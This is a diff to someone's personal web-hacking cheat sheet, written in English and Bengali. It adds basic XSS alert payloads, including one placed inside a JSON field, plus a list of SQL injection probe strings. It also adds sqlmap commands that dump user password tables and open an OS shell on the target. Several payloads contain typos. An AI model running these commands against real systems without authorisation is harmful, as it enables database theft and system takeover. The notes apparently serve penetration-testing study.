@@ -123,7 +123,7 @@ note: page-250 //most important
 #arjun tools // for http peraminter finding 
         arjun -u http://bbc.om/
 
-#xsx
+#xsx 
         script>alert("xss")</script>
         <script>alert(1);</script>
         <%00script>alert(1)</%00script>
@@ -132,3 +132,36 @@ note: page-250 //most important
         
         https://github.com/xmendez/wfuzz/tree/master/wordlist // wfuzz wordlist
         https://netsec.expert/posts/xss-in-2020/index.html      // most powerfull website xss
+#XAS এই attack er জন্য আমরা json meramiter এর valueভিতর xss payload দিতে হবে। example
+        {
+                "lname":"<scpript>alert(1></script>"
+        }
+        note: 400 bad request দেখায় , তাহলে ওইখানে brruteforce করতে হবে।সেখানে sensetive ইনফো আছে ।।
+
+#sql injections 
+        {
+                '
+                ''
+                ;%00
+                --
+                -- -
+                ""
+                ;
+                ' OR '1
+                ' OR 1 -- -
+                " OR "" = "
+                " OR 1 = 1 -- -
+                ' OR '' = '
+                OR 1=1
+        }
+        After finding  burpsuite sql error  ,we are try sqlmap autometic database finder
+sqlmap: 
+        sqlmap -r /home/hapihacker/burprequest1 -p password
+        sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –dump-all
+        sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –dump -T users -C password -D helpdesk
+
+        
+        web shell and execute the shell to grant you with system access:
+        sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –os-shell
+        sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –os-pwn //it alternative above command
+        
